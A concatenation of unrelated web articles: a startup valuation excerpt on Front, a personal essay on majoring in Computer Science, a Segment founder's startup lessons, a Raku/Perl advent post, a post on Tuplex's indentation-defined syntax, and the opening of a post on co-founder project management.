</li></ul><h2 id="valuation--front-is-worth--1-3b">Valuation: Front is worth $1.3B</h2><p>Today, based on our model, we estimate Front is worth about $1.3B, with a fair share price of $9.5 to $11.</p><p>That’s up 40% from Front’s Series C, which valued the company at about $7.7 per share or $920M post-money. At the time, Front was at $26M ARR growing 5% CMGR6 for a 35x multiple.&nbsp;</p><p>Today, we project Front is at about $38M ARR or $3.1M MRR, growing 3% CMGR6.&nbsp;</p><img src="https://images.prismic.io/sacra/731caebc-6ce9-4c26-8451-56f39d4618df_image13.png?auto=compress,format"><p><em>Applying the 35x multiple from Front’s last round to their current $38M revenue run rate gives us a valuation of $1.3B and an implicit per share price of $11. <a href="https://sacra.com/research/front-initiating-coverage-research-report/access" rel="noopener noreferrer" target="_blank">Click here</a> to get the full data set.</em></p><p>Slack, for reference, was growing at 12% CMGR6 at the same ARR. According to our model, Front hasn’t grown at more than 10% CMGR6 since the summer of 2017, with growth hanging steady around 5% CMGR between April 2019 and early 2020, then declining slightly with the onset of COVID-19 in March.&nbsp;</p>

              <p>This is my own journey on getting a CS degree and why I think you should or shouldn't major in Computer Science.</p><p>If you google right now, what are the best majors to study in college, it's a guarantee that Computer Science (CS) will be on almost every list. There are so many statistics about how much <a href="https://insights.dice.com/2019/06/12/computer-science-graduates-earnings/">CS graduates make</a>. At some big companies the likes of FAANG (Facebook, Amazon, Apple, Netflix, Google), fresh CS graduates can easily command six figures salaries, including benefits and cool perks. The total compensation in these companies is hardly less than six figures ($100,000)!</p><p>Computer Science is considered one of the top majors as far as ROI (Return on Investment) is concerned. Just year one out of school and into the workforce a CS grad will be making higher compared to grads from other majors. Even when someone isn't lucky enough to land one of the positions in big tech companies (FAANG), still they can easily make 55k fresh from school. <em>It should also be noted that the writer of this article is based in the US, so the figures here might not be so representative of other regions in the world.</em></p><p>So looking at the job prospects and earning potential, you can see why there is such a flux of students wanting to do CS in college.</p><p>And here is the question, should you major in Computer Science? </p><p>This post is about my journey on deciding to major in CS and why I would advise someone to major or not to major in CS. </p><p>...</p><p>December 2014, I got the news that I will be going to a small college in the Midwest of the United States for my college education. I was 23 by the time and at that point in my life, I had made some big life mistakes already (like quitting high school to become a professional athlete). As you might have guessed that didn't end well. 2 years and a half taught me a lot about life, dreams, aspirations. and most importantly it taught me about family...that will be a blog post for some other time. But there I was reading the email that in about 8 months I would be in school again for my bachelor's. Before quitting high school, I used to say to myself... "if I go to college I would study Psychology and Philosophy"...because the two fields really dug my intellectual curiosity. But when people asked me what would I do with Psychology or Philosophy...I didn't know what to tell them...I only knew I wanted to learn more about the two fields. I wasn't interested in a professional career in any of the two fields...just wanted to study them. Did that ever happen to you?</p><p>So I didn't want to make the same mistakes I did during high school years...I intentionally made a choice of choosing a major field of study that will be lucrative and pretty much guarantee me success. There I was googling the best majors to study in college.</p><p>Here is a short snippet of that research:</p><figure><img src="https://monalidor.com/content/images/2020/11/Majors-That-Pay-Back.png" alt="Majors That Pay You Back" srcset="https://monalidor.com/content/images/size/w600/2020/11/Majors-That-Pay-Back.png 600w, https://monalidor.com/content/images/size/w1000/2020/11/Majors-That-Pay-Back.png 1000w, https://monalidor.com/content/images/size/w1600/2020/11/Majors-That-Pay-Back.png 1600w, https://monalidor.com/content/images/2020/11/Majors-That-Pay-Back.png 2000w" sizes="(min-width: 720px) 720px"><figcaption>Majors That Pay You Back</figcaption></figure><figure><img src="https://monalidor.com/content/images/2020/11/Major-vs-Salary.png" alt="Major vs Salary Potential" srcset="https://monalidor.com/content/images/size/w600/2020/11/Major-vs-Salary.png 600w, https://monalidor.com/content/images/size/w1000/2020/11/Major-vs-Salary.png 1000w, https://monalidor.com/content/images/size/w1600/2020/11/Major-vs-Salary.png 1600w, https://monalidor.com/content/images/2020/11/Major-vs-Salary.png 2000w" sizes="(min-width: 720px) 720px"><figcaption>Major vs Salary Potential</figcaption></figure><p>Armored with that research plus a lot of other information I got from friends who were already studying CS and those who graduated with good jobs, I narrowed to Computer Science.</p><p>...</p><p>Fall 2015, my first year in college:</p><figure><div><div><p><img src="https://monalidor.com/content/images/2020/11/Fall-2015-CS-Classes.png" width="2000" height="1200" alt="" srcset="https://monalidor.com/content/images/size/w600/2020/11/Fall-2015-CS-Classes.png 600w, https://monalidor.com/content/images/size/w1000/2020/11/Fall-2015-CS-Classes.png 1000w, https://monalidor.com/content/images/size/w1600/2020/11/Fall-2015-CS-Classes.png 1600w, https://monalidor.com/content/images/2020/11/Fall-2015-CS-Classes.png 2000w" sizes="(min-width: 720px) 720px"></p><p><img src="https://monalidor.com/content/images/2020/11/Spring-2016-CS-Classes.png" width="2000" height="1200" alt="" srcset="https://monalidor.com/content/images/size/w600/2020/11/Spring-2016-CS-Classes.png 600w, https://monalidor.com/content/images/size/w1000/2020/11/Spring-2016-CS-Classes.png 1000w, https://monalidor.com/content/images/size/w1600/2020/11/Spring-2016-CS-Classes.png 1600w, https://monalidor.com/content/images/2020/11/Spring-2016-CS-Classes.png 2000w" sizes="(min-width: 720px) 720px"></p></div></div><figcaption>Fall 2015 (Left) &amp; Spring 2016(Right) CS Classes</figcaption></figure><p>Sophomore year, Fall 2016</p><figure><div><div><p><img src="https://monalidor.com/content/images/2020/11/Fall-2016-CS-Classes.png" width="2000" height="1200" alt="" srcset="https://monalidor.com/content/images/size/w600/2020/11/Fall-2016-CS-Classes.png 600w, https://monalidor.com/content/images/size/w1000/2020/11/Fall-2016-CS-Classes.png 1000w, https://monalidor.com/content/images/size/w1600/2020/11/Fall-2016-CS-Classes.png 1600w, https://monalidor.com/content/images/2020/11/Fall-2016-CS-Classes.png 2000w" sizes="(min-width: 720px) 720px"></p><p><img src="https://monalidor.com/content/images/2020/11/Spring-2017-CS-Classes.png" width="2000" height="1200" alt="" srcset="https://monalidor.com/content/images/size/w600/2020/11/Spring-2017-CS-Classes.png 600w, https://monalidor.com/content/images/size/w1000/2020/11/Spring-2017-CS-Classes.png 1000w, https://monalidor.com/content/images/size/w1600/2020/11/Spring-2017-CS-Classes.png 1600w, https://monalidor.com/content/images/2020/11/Spring-2017-CS-Classes.png 2000w" sizes="(min-width: 720px) 720px"></p></div></div><figcaption>Fall 2016 (Left) &amp; Spring 2017 (Right) CS Classes</figcaption></figure><p>By the end of Spring semester 2017, I had completed<strong> 22 credits of the 46 credits</strong> required by the CS program at my school.</p><p>In the fall of 2017, I didn't return back to campus...I had an opportunity to study abroad in London where for the whole semester I didn't take any Computer Science class.

But for easy of following through I just listed in the order of the first time I took them. In addition, I took one elective from another school which was <strong>CS 428</strong> <strong>Network Programming, </strong>and also I took <strong>EN 300C,</strong> an <strong>Advanced Writing</strong> class from another department in my school which substituted for my <strong>Technical Writing</strong> class in my CS major. And one more <strong>Math class</strong> was required to satisfy the requirements for the CS major.</p><p>So in a nutshell, that was my major. 4.5 or 5 years later, <strong>46 CS credits</strong> bagged and I graduated with a bachelor's in Computer Science.</p><p>The reason I listed all those classes above is to give you kinda a full picture of what a CS degree is about. When you just hear the words 'Computer Science', you might not really know what it's about...So the subjects above will at least shade some light. However, if you really wanna dive deep, I would suggest not just to look at the subjects offered in the program BUT make sure you read the syllabus too if you're able to get one. Syllabi will list topic by topic and week by week of exactly what the specific CS subjects will cover, there will be no surprises!</p><p>...</p><p>Now comes the meat of my blog post...Should you major in Computer Science?</p><p>Taking the money component out - we already know that a CS major can result in higher earning potential overall. What other reasons are there for you to major in see? Are you even interested in the field itself?</p><p>Most people when they hear about the Tech fields or Silicon Valley or working at Google or Microsoft, they mostly think about Computers and they might think about Computer Science as a way to get there, though they might not really know much about the Computer Science field itself.</p><p>I don't blame them, I was in the same situation...Initially I thought Computer Science will be learning about how to create these beautiful websites that I see on the Internet. Or maybe by studying Computer Science I will be able to make the next Facebook, Instagram and so forth. That was what initially clouded my mind.</p><p>Some of you might be surprised to know that a career in tech especially the one involving Computer Science or Programming for that matter...might not necessarily constitute you making products from scratch. There will be a lot of trying to understand, fix and maintain past code base. It might not be as alluring as some of the TV shows might make you believe. The technologies you work with might not be the ones of your interest. For example, I have never liked C# as a programming language or .NET frameworks as a web dev platform but there I was at my first job...using Windows, Visual Studio and .NET framework. You can imagine how excited I was.</p><p>...</p><p>As someone who has traveled this journey though not for so long, I can't emphasize enough on the importance of knowing exactly what you're getting yourself into. After all, college is a big investment both in terms of money and time, so pick both your majors and career carefully. One way of getting a good feel for what you're getting yourself into, either it's Computer Science or any other field is to make sure you get some internships while in college. Get an internship in something you're either majoring in or considering a career in. That will give you real-world experience of what your profession will look like once you graduate. It will give you time to think about the work culture, the work hours, the pressure, the work itself, etc. ...I had a friend in college who after doing an internship for about 4 months or so...he found out a career in Computer Science or programming wasn't for him. And he went ahead and changed his major from Computer Science to Economics, on the way he secured a minor in Computer Science.</p><figure><img src="https://monalidor.com/content/images/2020/12/Monalidor---Do-you-like-your-job.png" alt="Do you like your job?" srcset="https://monalidor.com/content/images/size/w600/2020/12/Monalidor---Do-you-like-your-job.png 600w, https://monalidor.com/content/images/size/w1000/2020/12/Monalidor---Do-you-like-your-job.png 1000w, https://monalidor.com/content/images/size/w1600/2020/12/Monalidor---Do-you-like-your-job.png 1600w, https://monalidor.com/content/images/2020/12/Monalidor---Do-you-like-your-job.png 2000w" sizes="(min-width: 720px) 720px"><figcaption>Do you like your job?</figcaption></figure><p>One of the things that will make you like your job is by first enjoying studying the field that you're in. Do you enjoy the field you're majoring in?</p><p>Look at the classes I listed above, do they interest you in any way? If they do then congrats! A CS program might be a good fit. But don't just end there like I said in the beginning...I would like you to go and check the syllabus for all those classes and see what you will study week in and week out. </p><p>Let me tell you something... as someone who was more interested in web development...I didn't enjoy most if not all of my CS classes. Had I used that time to learn more about web design and development...learning specific languages used for the job I would have benefited more and enjoyed my time in college. Here web development technologies like JavaScript, PHP and their frameworks together with WordPress, SASS, the JAM stack, etc.</p><p>So what am I trying to say here..? If the reason you decided to get into a CS program is because you love to design and develop websites...then you might be in the wrong place...a CS class in Computational modeling will be pretty much a bore to you. You would appreciate that time instead if you were learning first hand the tools and languages you will be working with in the real world.</p><p>Walk this process backward...ask yourself...who do you want to become...a web developer? a software engineer? a UI/UX engineer? a database administrator..? a network engineer? Then once you know whom you want to become...look for resources that will allow you to do that...these might involve a major in college, maybe a minor, books, online courses, tools used in the industry, etc.</p><p> If you pick a major, don't be blinded by a bracket name like a 'Computer Science'. Understand exactly what that entails...go and look at the syllabus of each course you will take in that major. Don't just assume a CS major will grant you those mobile or web development skills etc. The job market can be very specific...They might look for a Java developer, a PHP developer, a Python developer, an iOS developer etc. While knowledge of one language might help you easily pick up another one...it's a good thing if you can focus on what you're interested in early on. </p><p>...Being a mobile developer is different from being a web …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>In Segmentâ€™s early days, we hit countless problems as a founding team. And at the time, I thought those problems were unique to our own special snowflake of a founding journey. I chalked it up to us being new grads and first-time founders.</p><p>But as I've worked with more and more startups, I've realized just how wrong I was.</p><p>Over the past five years, I've made about 25 different seed-stage investments. In doing so, it's taught me a <em>LOT</em> about the common errors that startup founders make. Even across different industries and levels of experience, I see founders hitting the exact same set of problems we encountered in the early days of Segment!</p><p>This post shares a handful of the top lessons that benefit todayâ€™s early stage founders. Itâ€™s a list of the things I wish weâ€™d figured out earlier at Segment. [1]</p><p>This sounds incredibly boring... but the #1 mistake I see startups making is that they donâ€™t set goals. If you take one thing from this post, it's that you should set goals for where you want to be.</p><p>For the longest time at Segment, we didn't have goals. We moved ahead in various (often random) directions, and we would launch features consistently... but we never really set goals at all.</p><p>As we grew the company, we started to lose momentum. Teams were spending time on a bunch of stuff that frankly just didn't really matter to the overall business.</p><p>It wasn't until we hired our VP Eng, Tido, that we finally started setting focused and audacious product goals. Just by verbalizing where we wanted to go and then grading our results, our velocity improved by an order of magnitude.</p><p>I don't care if you call them OKRs, sprints, or something else entirely. Just set a deadline when you want to have something done and a metric you want to move or some other concrete result.</p><p>When early stage founders do attempt to set goals, I often see them agonize over what specific goals to choose. In practice, a "pretty good goal" is way better than "no goals at all". Perfect is the enemy of good.</p><p>If you don't yet have product-market fit, your goal should probably be getting your first 3-5 customers using the product. If you've hit the level where you now have dozens of users, your goal should be growing by an order of magnitude. It's better to get in the habit of setting and driving towards goals rather than being too worried about their exact semantics. Worst case, you just pick a better goal later.</p><p>A great set of goals answers the question: <em><strong>"what would have to be true in order for us to feel good about our progress at the end of the month?"</strong></em><em> [2]</em></p><p>If each teammate can independently answer "what are our goals for the month?" in the same way, you'll know you've succeeded. If youâ€™re looking for prior art, read <a href="https://www.amazon.com/Measure-What-Matters-Google-Foundation/dp/0525536221">Measure What Matters</a>. </p><p>If you strictly focus on making things true by a certain date, you are bound to make at least some progress towards your end result. </p><p>At the end of the day, every billion-dollar startup is really just the sum of many small deltas.</p><p>Let's get one thing straight: your investors won't know everything. But investors won't know <em>anything</em> if you don't keep them updated on how things are going.</p><p>For the longest time, we were fearful of our Segment investors, to the point that we wouldn't bother sending them emails unless they asked about us. I can say now with confidence that this was 100% the wrong approach.</p><p>We worried that investors would think that we were screwing up (true) and failing (true as well!). And while that might be the case, a founder-friendly investor won't think that way. Investors, especially angels, invested because they believe in <em>you</em>. If I didn't think a team would go somewhere, I wouldn't put money in.</p><p>With each investor, <strong>include the goals you're working towards, as well as the asks for them</strong>. I think monthly is about the right cadence for this in the early days, moving to quarterly around Series A/B time when you start partnering more with a few board members.</p><p>Simply writing the updates should clarify your own thinking tremendously. If it takes you more than 1-2h to put together an update on the most important things happening at the company, it's probably a sign that you should be doing more thinking about the big picture.</p><p>When asking for help, the things that our investors have been able to help us with evolved quite a bit over time. But here's a good rule of thumb for what to ask for:</p><ul><li><p><u>Seed/Pre-seed</u>: user-testing, intros to beta users, hiring</p></li><li><p><u>Series A</u>: hiring, early customers, go-to-market</p></li><li><p><u>Series B/C+</u>: comparables at other companies, senior/exec hires, specific expertise around things like management, infrastructure, systems, etc.</p></li></ul><p>Not all investors will be able to help with everything. But at the very least, sending them information will help you be top of mind. I've lost track of how many times a moment of serendipity where I'm catching up with an old friend has led to a meaningful conversation for a company I've invested in.</p><p>As an extra bonus, the strongest startups send these updates to everyone on their team. It's amazing how much putting the goals in writing helps everyone stay on the same page about what's most important.</p><p>One other note here: take pictures. I now wish we had far more pictures of Segment at every stage of the company. They help turn investor updates into cherished memories.</p><p>Okay, this lesson is taken directly from the YC playbook. And YET, I see so many founders (including YC founders) fail to launch their product. </p><p>If no one notices your launch... just ignore it and then launch again. If you're doing things right, you'll never run out of stuff to launch! [3]</p><p>Why is launching so important? Let me share a personal story...</p><p>We spent about 1.5 years building different iterations of analytics tools. For every iteration, we had a waitlist that users could sign up to use. We personally reached out to the users who we thought were the best fits, and then tried to set up time to use the product. </p><p>The result? Nobody cared. We had no users. We never launched. </p><p>When we finally launched Segment in it's current incarnation, we threw out that approach entirely. We put up a self-service flow, and let anyone who wanted to sign up for it.</p><p>That's when something strange happened... we attracted an entirely new set of developers who just were crawling out of the woodwork and excited to use the new product we'd built. They were coming from companies far outside of SV that we'd never heard of.</p><p>It floored me.</p><p><strong>Lesson learned: the people you happen to be talking to now are probably not the people who have the biggest problem in your space. Do everything you can to reach the folks with the biggest problem, and then, reduce any barriers they might encounter.</strong></p><p>I expect a bunch of you reading this post to ignore this advice, just like we did in the early days. It takes a certain confidence to launch something you've built and put it out there for the world to see. Ultimately though, the rewards are worth it. You'll see users coming from communities you've never even heard of.</p><p>Let me tell you a tale of two startups.</p><p><strong>Startup A</strong> is constantly putting up interesting content on their blog. Their founders are sharing product launches, engineering posts, and creatively brainstorming about what it takes to solve problems in their market.</p><p><strong>Startup B</strong> is operating in stealth. You can't find much about them online, but one of the founders reached out with a nice personalized email mentioning their funding by a top-tier VC. </p><p>Suppose you're looking for a job... do you pick Startup A or Startup B? In my experience, A almost always wins. Momentum is a compounding force.</p><p><strong>Unless you are working in a space that heavily depends on IP, you should probably be publishing more content about what you are doing.</strong> This could be open source, it could be a weekly newsletter, it could be a changelog. [4]</p><p>Whatever it is, it's going to help you both hire <em>and</em> attract customers. So much of the internet is merely about consuming, that just by putting ideas out there, youâ€™ll have a leg up on the competition.</p><p>In the early days of Segment, our <a href="https://segment.com/blog/show-hn-to-series-d/">user acquisition was powered by open source projects and blog posts</a>. But I've seen founders have success with Twitter, Substacks, Podcasts and a variety of different channels.</p><p>If you're looking for inspiration, the <a href="https://railway.app/changelog">Railway</a> and <a href="https://linear.app/changelog">Linear</a> changelogs are epic examples. Companies like <a href="https://baremetrics.com/blog/i-sold-baremetrics">Baremetrics</a> and <a href="https://buffer.com/resources/shareholder-update-q2-2020-and-july/">Buffer</a> differentiated themselves by just being open and honest. <a href="https://stripe.com/blog/globe">Stripe</a> and <a href="https://www.figma.com/blog/behind-the-feature-the-making-of-the-new-auto-layout/">Figma's blogs</a> not only share what they build, but how they built it.</p><p>There are three big inputs that all startups need to continue growing</p><ol><li><p>product capabilities</p></li><li><p>customers and users</p></li><li><p>hiring</p></li></ol><p>I've put them in roughly the order that most teams encounter them. </p><p>Startups begin with a small product that has a modicum of utility. It starts attracting a handful of customers organically. And as more and more customers start using the product, the founders realize that they need extra help to stay on top of all of those requests.</p><p>Remember though, the real goal here is #2. Itâ€™s not the size of your team, itâ€™s the value youâ€™re able to provide to the world. [5]</p><p>I see hiring a big team before you have product-market fit as a red flag. If the company doesn't yet have a set direction, it's going to be harder to pivot with 10 people than it is with 3.</p><p>But, I've worked with startups who have traction and runway... and just seem to be spinning their wheels under load from existing customers.</p><p>I get it. Hiring isn't the most fun, especially for an introvert. It's a lot of interviewing and feeling like there's a lot of rejection. Rejecting people sucks. Losing candidates sucks.

<p>‘<a href="https://perl.org/">Perl</a> is dead’, is a meme that’s just plain wrong. <a href="https://www.perl.org/about.html">Perl isn’t dead</a>. It’s just dead to some programmers. Complicated regexes? Sigils? There’s more than one way to do it (<a href="https://docs.raku.org/language/glossary#TMTOWTDI">TMTOWTDI</a>)? Sometimes when programmers encounter Perl in the wild they react with fear. “WTF!?”, they cry! But fear needn’t be a Perl killer. If you take the time to see past Perl’s imperfections and <a href="https://www.perl.org/learn.html">walk the learning curve</a>, there are rich rewards: Perl is an imperfect but pragmatic and expressive language that for 30+ years has helped programmers get the job done.</p>



<p>When <a href="https://en.wikipedia.org/wiki/Larry_Wall">Larry Wall</a> <a href="https://design.raku.org/">designed</a> <a href="https://raku.org/">Raku</a>, with the <a href="https://github.com/Raku/mu/blob/master/AUTHORS">help of the Perl community,</a> he fixed most of Perl’s imperfections and doubled down on Perl’s DNA. Perl values pragmatism, expressivity, and whipupitude and Raku does too! Why stop at sigils ($@%) when you can have twice the fun with <a href="https://docs.raku.org/language/variables#Twigils">twigils</a> ($!, %!, @! etc)?</p>



<p>For some programmers, however, the mere sight of a twigil can induce fear. Like Perl, Raku’s expressive power is a double-edged sword – potentially stopping other programmers in their tracks. A Raku programmer’s, “<a href="https://docs.raku.org/language/glossary#DWIM">DWIM</a>” (do what I mean) can be another programmer’s, “<a href="https://docs.raku.org/language/glossary#WAT">WAT</a>!?”</p>



<h2><a href="https://gist.github.com/nige123/2b7b384dfe2c6e732ecb1c62b3ce6c52#fear-free-code-that-flows"></a></h2>



<h2>Fear-free code that <em>flows</em></h2>



<p>We write programs for two audiences: humans and the computer. It’s the humans that should come first. If I can’t understand my own code in a week’s time, what hope do my colleagues have? Fortunately we can help ourselves, and each other, to have a smooth ride up the Raku learning curve.</p>



<figure><a href="https://camo.githubusercontent.com/adae2c7bc72f3b2b7480d1769cd89dddab1eb4302e4cafd7930760a584477dfb/68747470733a2f2f7065726c36616476656e742e66696c65732e776f726470726573732e636f6d2f323031352f31322f63616d656c69612d666c6f77696e672e676966" target="_blank" rel="noreferrer noopener"><img src="https://camo.githubusercontent.com/adae2c7bc72f3b2b7480d1769cd89dddab1eb4302e4cafd7930760a584477dfb/68747470733a2f2f7065726c36616476656e742e66696c65732e776f726470726573732e636f6d2f323031352f31322f63616d656c69612d666c6f77696e672e676966" alt=""></a></figure>



<p>Learning Raku is never boring but when did you last encounter a bump while learning Raku? That’s a chance for you to help yourself and others. You could leave an empathic comment in your code, contribute some documentation, write a blog post, give a talk, ask and answer a question on StackOverflow etc.</p>



<p>The joy of programming is <em><a href="https://perl6advent.wordpress.com/2015/12/20/perl-6-christmas-have-an-appropriate-amount-of-fun/">finding flow</a> </em>for ourselves and each other while getting things done. No Raku-riffing-rockstars required.</p>

<h2>Surfing the learning curve</h2>



<p>Maybe you haven’t started learning Raku yet? Now is the perfect time to add Raku to your toolbox. Here are some of the learning resources I’ve found useful and I hope you do too.</p>



<p>Firstly, there is the pithy and concise <a href="https://raku.guide/">introduction to Raku</a> that includes instructions on how to install Raku. The Raku interpreter itself is very helpful. If your Raku program contains errors <a href="https://perl6advent.wordpress.com/2016/12/19/fixing-flow/">Raku often suggests ways to fix them</a>.</p>



<p>For programmers coming from other language(s), <a href="http://www.rosettacode.org/wiki/Category:Raku">RosettaCode</a> showcases coding solutions in different languages side-by-side. Prepare to be pleasantly surprised by the expressive power of Raku’s operators. Raku’s expressivity typically results in <a href="http://www.rosettacode.org/wiki/Last_Friday_of_each_month#Raku">less lines of code</a> (LLOC).</p>



<p>An idea for your first Raku program is to translate a progam you know well from a different language. Here are some helpful guides for translating from other languages to Raku: <a href="https://docs.raku.org/language/5to6-nutshell">Perl</a>, <a href="https://docs.raku.org/language/py-nutshell">Python</a>, <a href="https://docs.raku.org/language/rb-nutshell">Ruby</a>, <a href="https://docs.raku.org/language/haskell-to-p6">Haskell</a> and <a href="https://docs.raku.org/language/js-nutshell">Javascript</a>.</p>



<p>There’s a growing list of books on Raku and a <a href="https://perl6book.com/">flowchart for choosing one</a>. Here’s a selection:</p>



<ul><li><a href="https://www.learningraku.com/">Learning Raku</a></li><li><a href="https://www.apress.com/gp/book/9781484261088">Raku Fundamentals</a></li><li><a href="https://www.apress.com/gp/book/9781484262573">Raku Recipes</a></li><li><a href="https://www.apress.com/gp/book/9781484232279">Parsing with Perl 6 Regexes and Grammars</a></li></ul>



<p>Searching for Raku-related problems will often point to the official documentation at <a href="https://docs.raku.org/">docs.raku.org</a> or <a href="https://stackoverflow.com/questions/tagged/raku">Raku answers on StackOverflow</a>.</p>



<p>When you want to learn more about a specific sub-topic or dive into the deeper design philosophy of Raku check out <a href="https://www.jnthn.net/slides.html">Jonathan Worthington’s clear presentations and explanations</a>.</p>



<p>Finally if you’re stuck on something, or just want to share in the –<a href="https://www.raku.org/fun/">Ofun</a> of learning Raku the <a href="https://www.raku.org/community/irc">#raku IRC channel on freenode</a> is friendly and welcoming.</p>



<p>Both Perl and Raku are useful tools in any programmer’s toolbox: no fear needed, just remember to help the code <em>flow</em>!</p>



<p>Long live Perl and Raku.</p>



<p>Happy Christmas!</p>

<p>Labels: Syntax</p>

<h3 id="indentation-defined-program-structure">Indentation-defined program structure</h3>

<p>I’ve planned for a long while to make Tuplex program structure indentation-defined like in e.g. Python.
Dispensing with curly braces and semicolons makes the code easier on the eye, and easier to type.
However this required a complete rewrite of the lexical scanner - the first compilation pass that scans the source text -
so I had been putting it off. Now it’s done!</p>

<h3 id="syntax-summary">Syntax summary</h3>

<p>The scanner will produce tokens INDENT and DEDENT upon increases and decreases in the indent level.
These have the same semantic meaning regarding scope structure as { and } did previously.</p>

<blockquote>
  <p>If a decrease doesn’t match an earlier indent level an <em>inconsistent indentation</em> error is generated.</p>
</blockquote>

<p>A sub-scope is preceded by a header, which ends with a colon and a newline, and is demarcated using an increased indent.
(A missing INDENT after COLON NEWLINE is an error.)</p>

<div><div><pre><code>if i &gt; 0:
    do_this()
    do_that()
else:
    do_other_stuff()
do_in_any_case()
</code></pre></div></div>

<p>Semicolons are now optional. A newline is in most cases sufficient statement terminator.</p>

<p>One-liners are written like this:</p>

<div><div><pre><code>if flag: v = 128; else: v = 256
</code></pre></div></div>

<h3 id="drawbacks">Drawbacks</h3>

<p>Most programming languages do not use significant whitespace. Instead they use explicit printable tokens,
such as begin/end or { }. This makes it easier to implement parsers,
easier to programmatically generate source code (or embed source code within other files and programs),
and reduces risks of ambiguities in the grammar.</p>

<p>Explicit scope / suite enclosure also makes it easier to format statement lines and blocks as the
programmer sees fit. One can distribute a long statement across several lines,
or list several short statements as a concise one-liner. It separates source formatting from program logic.</p>

<p>If indentation is significant it means the tabs-or-spaces question is no longer entirely facetious.
In any given source text one or the other must be chosen. Although the parser can count both tab and space
characters just fine, it is debatable how many spaces shall correspond to a tab,
and above all they are not visually distinguishable.
Mixing tabs and spaces leads to ambiguity for the programmer, and is therefore disallowed.</p>

<h3 id="good-bye-curly-braces">Good-bye curly braces</h3>

<p>Python popularized the indentation-defined syntax and showed it can be combined with a largely elegant and
unambiguous grammar if the whole language syntax is designed with this approach in mind.</p>

<p>Curly braces are clear in meaning and stand out visually. But above all they are for the benefit of the parser,
not the programmer. Braces (or begin/end keywords) make it significantly easier to parse blocks and program structure.</p>

<p>A good programmer will indent the code consistently anyway. Braces only rarely convey meaning to a human reader
that isn’t already apparent from the indentation, which means they are typically redundant to the human.
If they are redundant they add noise that the programmer must look past, and if they also stand out visually
more attention must be spent on it.</p>

<p>In short, braces are for parsers and indentation is for programmers. Tuplex strives to impose a minimum of syntactic
and grammatical artefacts, and eliminate redundancy and boilerplate as much as possible. Thus the choice to 
reduce visual friction rather than make parser implementation easier.</p>

<h3 id="good-bye-semicolons">Good-bye semicolons</h3>

<p>Semicolons are optional, for much the same reasons as braces. The newline is in most cases a very natural statement
terminator. Semicolons may still be specified, for example to denote the empty (no-op) statement, or to separate
multiple statements on the same line.</p>

<p>Some statements get very long, for example long argument lists and complex long condition expressions are not that uncommon.
To facilitate this, a line that ends with a comma will have its linebreak ignored.
And in order to write a long expression across multiple lines it can be enclosed in parentheses.</p>

<p>Generally, any source text enclosed in (parentheses), [brackets], or {braces} will ignore line breaks.</p>

<h3 id="attempts-at-supporting-both-indentation-defined-and-brace-defined-syntax">Attempts at supporting both indentation-defined and brace-defined syntax</h3>

<p>With the existing grammar parser (built using Bison) there are still some limitations on how smart it can be
parsing the indentation- and newline-defined syntax. This causes some extended one-liner constructs to still
require braces, or an occasional extra semicolon at the end.</p>

<p>I explored a grammar design that would allow for both worlds, both brace-enclosed and
indentation-defined blocks, used and mixed as the programmer sees fit.
However this leads to a bunch of edge cases, and the biggest
problem is that resolving them requires ad-hoc rules for the grammar - there is
no intuitive “obviously correct way” when mixing them.</p>

<p>Consider for example, if allowing brace-enclosed and indentation-defined blocks within each other,
what a consistent treatment of these blocks would be:</p>

<div><div><pre><code>if condition: {
        brace-enclosed body  ## note - INDENT
    }  ## note - DEDENT...
    {
        body part 2 with its own var-scope
    }

if condition:
    ## can an if-true-body now consist of several brace-enclosed blocks because they have similar indentation?
    {
        body part 1 with its own var-scope
    }
    {
        body part 2 with its own var-scope
    }
else:
    something_else()
</code></pre></div></div>

<p>In the end, I enabled support for brace-enclosed scopes but disallowed mixing them with indentation-defined ones.
Within braces, INDENT, DEDENT, and NEWLINE are simply ignored (same as between parentheses and brackets).</p>

<h4 id="consistent-rules">Consistent rules</h4>

<p>A couple of specific rules needed to be defined to avoid ambiguities.</p>

<p>A. Within braces, all statements must be terminated with semicolon. (This makes the syntax similar to C et al.)</p>

<p>B. The colon must be on the same line as the preceding statement in order to prevents this sort of ambiguity:</p>

<div><div><pre><code>if condition
    :            ## INDENT
    something()  ## no INDENT...

if condition
    : something()   ## INDENT
      other()       ## inconsistent INDENT
</code></pre></div></div>

<p>C. One-liner syntax can’t be mixed with indentation body syntax. This is an error:</p>

<div><div><pre><code>if condition: do_this()
    do_that()
</code></pre></div></div>

<p>D. Brace-enclosure is needed to support single-line statement suites:</p>

<div><div><pre><code>if cond1: do_a(); else: if cond2: { do_b(); do_c(); } else: do_d()
</code></pre></div></div>

<p>E. For lambda expressions within statements, an extra semicolon can be necessary:</p>

<div><div><pre><code>localFunc := ( a : Int )-&gt;Int : return a * 2; ;
</code></pre></div></div>

<p>Without a custom context-sensitive grammar / recursive descent parser the last semicolon above is hard to
avoid. In the current Tuplex grammar it is necessary.
The first semicolon terminates the lambda body’s statement; the second terminates the assignment statement.</p>

<h3 id="implementing-a-custom-scanner">Implementing a custom scanner</h3>

<p>The lexical scanner needs to understand both line structure, scope structure and token syntax. This
was difficult to implement with the Flex scanner Tuplex was originally built with.
So I built a custom scanner from scratch.</p>

<p>It was quite fun, and ended up being fairly efficient. I did manage to avoid writing an entire
regexp-engine while allowing for a decent amount of flexibility in evolving the lexemes and tokens
of Tuplex. Some benefits of the custom implementation include better support for edge cases in
string formatting syntax and in floating point literals.</p>

<p>One thing it doesn’t quite support at this stage is unicode. Tuplex shall support proper UTF-8 eventually,
but at that point the scanner will need some tweaking to not assume single-byte characters.</p>

<p>Since Bison expects a Lex/Flex interface I also wrote a facade for the scanner to translate between their
handling of line/positions and semantic values of literals. Also, since the previous Flex scanner
handled file reading, I had to write a file-to-memory reader to replace it.</p>

<p>Long-term I will probably replace the Bison-generated parser with a custom one as well, but I’m putting it
off as long as I can. Bison can handle almost everything Tuplex needs. There are some edge cases around
NEWLINE interpretation (e.g. the extra semicolon requirement above),
but I think Tuplex can live with that for the time being!</p>

				<p>Let’s imagine a two person startup where each co-founder is equal and there are no roles.</p>

<p>Now suddenly any number of corporate trappings of software development fall away:</p>
<ul>
  <li>There is no ‘management’ - neither co-founder can fire the other or set their salary</li>
  <li>There are no dedicated roles like program managers, product managers, marketing, sales - anyone can be
assigned anything</li>
</ul>

<p>One might imagine that in such an environment all <a href="https://techbeacon.com/app-dev-testing/project-management-surefire-way-kill-your-software-product">project management</a>
falls away and the startup is a developer utopia. <em>That’s not what happens.</em></p>

